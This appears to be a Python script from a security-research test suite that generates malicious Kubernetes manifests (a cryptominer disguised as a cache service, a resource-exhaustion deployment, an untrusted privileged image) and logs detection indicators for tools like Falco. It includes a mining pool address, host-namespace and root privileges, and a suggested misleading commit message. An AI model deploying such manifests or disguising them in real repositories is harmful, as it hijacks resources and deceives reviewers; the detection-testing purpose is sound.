#!/usr/bin/env python3
"""
Attack Scenario 6.1: Unusual Container Spawning
================================================

Creates Kubernetes deployment with malicious characteristics:
- Excessive replicas
- Privileged containers
- High resource requests
- Untrusted images

RESEARCH ONLY - Academic purposes, controlled environment.
"""

import os
import sys
import json
from pathlib import Path
from datetime import datetime
import yaml


class ContainerAbuseAttack:
    """Simulates container abuse attack."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.k8s_dir = self.repo_root / "kubernetes"
        self.malicious_deploy = self.k8s_dir / "malicious-deployment.yml"
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')

    def create_malicious_deployment(self, attack_type="cryptomining"):
        """Create malicious Kubernetes deployment."""
        print(f"[*] Creating malicious deployment (type={attack_type})...")

        self.k8s_dir.mkdir(exist_ok=True)

        if attack_type == "cryptomining":
            # Cryptomining disguised as cache service
            manifest = {
                'apiVersion': 'apps/v1',
                'kind': 'Deployment',
                'metadata': {
                    'name': 'cache-service',  # Innocent name
                    'labels': {'app': 'cache', 'component': 'storage'},
                    'annotations': {
                        'description': 'Redis cache layer',  # Misleading
                        'research-attack': 'true'  # Our marker
                    }
                },
                'spec': {
                    'replicas': 50,  # MALICIOUS: Way too many
                    'selector': {
                        'matchLabels': {'app': 'cache'}
                    },
                    'template': {
                        'metadata': {
                            'labels': {'app': 'cache'}
                        },
                        'spec': {
                            'containers': [{
                                'name': 'cache',
                                'image': 'nginx:latest',  # Fake, would be miner
                                'resources': {
                                    'requests': {
                                        'cpu': '2000m',  # MALICIOUS: High CPU
                                        'memory': '4Gi'  # MALICIOUS: High memory
                                    },
                                    'limits': {
                                        'cpu': '4000m',
                                        'memory': '8Gi'
                                    }
                                },
                                'securityContext': {
                                    'privileged': True,  # MALICIOUS
                                    'runAsUser': 0,  # MALICIOUS: Root
                                    'allowPrivilegeEscalation': True  # MALICIOUS
                                },
                                'env': [
                                    {'name': 'ATTACK_INDICATOR', 'value': 'cryptomining_simulation'},
                                    {'name': 'POOL', 'value': 'pool.minergate.com:45700'},
                                    {'name': 'WALLET', 'value': 'attacker-wallet-address'}
                                ]
                            }],
                            'hostNetwork': True,  # MALICIOUS: Host network access
                            'hostPID': True  # MALICIOUS: Host PID namespace
                        }
                    }
                }
            }

        elif attack_type == "resource_exhaustion":
            # Resource exhaustion attack
            manifest = {
                'apiVersion': 'apps/v1',
                'kind': 'Deployment',
                'metadata': {
                    'name': 'stress-test',
                    'annotations': {'research-attack': 'true'}
                },
                'spec': {
                    'replicas': 100,  # MALICIOUS: Massive replicas
                    'selector': {
                        'matchLabels': {'app': 'stress'}
                    },
                    'template': {
                        'metadata': {
                            'labels': {'app': 'stress'}
                        },
                        'spec': {
                            'containers': [{
                                'name': 'app',
                                'image': 'busybox',
                                'command': ['sh', '-c', 'while true; do :; done'],  # CPU burn
                                'resources': {
                                    'requests': {
                                        'cpu': '1000m',
                                        'memory': '2Gi'
                                    }
                                },
                                'securityContext': {
                                    'privileged': True
                                }
                            }]
                        }
                    }
                }
            }

        else:
            # Untrusted image
            manifest = {
                'apiVersion': 'apps/v1',
                'kind': 'Deployment',
                'metadata': {
                    'name': 'api-service',
                    'annotations': {'research-attack': 'true'}
                },
                'spec': {
                    'replicas': 20,  # Unusual
                    'selector': {
                        'matchLabels': {'app': 'api'}
                    },
                    'template': {
                        'metadata': {
                            'labels': {'app': 'api'}
                        },
                        'spec': {
                            'containers': [{
                                'name': 'api',
                                'image': 'attacker/malicious-api:latest',  # MALICIOUS: Untrusted
                                'resources': {
                                    'requests': {
                                        'cpu': '500m',
                                        'memory': '1Gi'
                                    }
                                },
                                'securityContext': {
                                    'privileged': True,
                                    'capabilities': {
                                        'add': ['SYS_ADMIN', 'NET_ADMIN']  # MALICIOUS
                                    }
                                }
                            }]
                        }
                    }
                }
            }

        # Write manifest
        with open(self.malicious_deploy, 'w') as f:
            yaml.dump(manifest, f, default_flow_style=False)

        print(f"[OK] Malicious deployment created: {self.malicious_deploy}")
        return manifest

    def log_indicators(self, attack_type, manifest):
        """Log behavioral indicators."""
        spec = manifest['spec']
        container_spec = spec['template']['spec']['containers'][0]

        indicators = {
            "attack_type": "container_abuse",
            "scenario_id": "6.1",
            "timestamp": datetime.now().isoformat(),
            "attack_variant": attack_type,
            "indicators": {
                "deployment_created": True,
                "deployment_name": manifest['metadata']['name'],
                "replicas": spec['replicas'],
                "namespace_avg_replicas": 3,
                "replica_anomaly": spec['replicas'] > 10,
                "privileged_container": container_spec['securityContext'].get('privileged', False),
                "run_as_root": container_spec['securityContext'].get('runAsUser') == 0,
                "host_network": spec['template']['spec'].get('hostNetwork', False),
                "host_pid": spec['template']['spec'].get('hostPID', False),
                "cpu_request_millicores": int(container_spec['resources']['requests']['cpu'].replace('m', '')),
                "memory_request_gb": int(container_spec['resources']['requests']['memory'].replace('Gi', '')),
                "namespace_avg_cpu_request": 250,
                "namespace_avg_memory_gb": 0.5,
                "resource_anomaly": True,
                "image": container_spec['image'],
                "untrusted_image": 'attacker' in container_spec['image'],
                "capabilities_added": container_spec['securityContext'].get('capabilities', {}).get('add', [])
            },
            "expected_detection": {
                "difficulty": "easy",
                "primary_signals": [
                    "replica_count_anomaly",
                    "privileged_container",
                    "resource_request_spike"
                ],
                "secondary_signals": [
                    "host_namespace_access",
                    "root_user",
                    "untrusted_registry" if attack_type == "untrusted_image" else "capability_escalation"
                ],
                "detection_tools": [
                    "KubeAudit",
                    "Falco",
                    "OPA/Gatekeeper",
                    "Kubernetes RBAC audit"
                ]
            },
            "mitre_attack": {
                "technique": "T1496",
                "name": "Resource Hijacking",
                "tactic": "Impact"
            }
        }

        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        log_file = log_dir / f"container_abuse_{self.backup_suffix}.json"
        with open(log_file, 'w') as f:
            json.dump(indicators, f, indent=2)

        print(f"[OK] Indicators logged: {log_file}")
        return indicators

    def execute(self, attack_type="cryptomining"):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 6.1: Container Abuse")
        print("=" * 80)
        print(f"\nAttack Type: {attack_type}")
        print("[!] RESEARCH ONLY - Controlled environment\n")

        manifest = self.create_malicious_deployment(attack_type)
        indicators = self.log_indicators(attack_type, manifest)

        print("\n" + "=" * 80)
        print("ATTACK EXECUTION SUMMARY")
        print("=" * 80)
        print(f"Status: SUCCESS")
        print(f"Attack Type: {attack_type}")
        print(f"Deployment: {indicators['indicators']['deployment_name']}")

        print(f"\nMalicious Characteristics:")
        print(f"  Replicas: {indicators['indicators']['replicas']} (baseline: 3)")
        print(f"  Privileged: {indicators['indicators']['privileged_container']}")
        print(f"  CPU Request: {indicators['indicators']['cpu_request_millicores']}m (baseline: 250m)")
        print(f"  Memory Request: {indicators['indicators']['memory_request_gb']}Gi (baseline: 0.5Gi)")

        if indicators['indicators']['host_network']:
            print(f"  Host Network: TRUE (DANGEROUS)")
        if indicators['indicators']['capabilities_added']:
            print(f"  Capabilities: {', '.join(indicators['indicators']['capabilities_added'])}")

        print(f"\nDetection Tools:")
        for tool in indicators['expected_detection']['detection_tools']:
            print(f"  - {tool}")

        print(f"\nTo apply (DO NOT RUN IN PRODUCTION):")
        print(f"  kubectl apply -f {self.malicious_deploy}")
        print(f"\nTo simulate without applying:")
        print(f"  kubectl apply -f {self.malicious_deploy} --dry-run=client")

        print(f"\nNext Steps:")
        print(f"  1. Review: cat {self.malicious_deploy}")
        print(f"  2. Commit: git add kubernetes/ && git commit -m 'Add resource scaling configuration'")
        print(f"  3. Security scans will detect malicious deployment config")
        print("=" * 80)

        return True


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--type', choices=['cryptomining', 'resource_exhaustion', 'untrusted_image'],
                       default='cryptomining', help='Type of container abuse')
    args = parser.parse_args()

    attack = ContainerAbuseAttack()
    success = attack.execute(attack_type=args.type)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
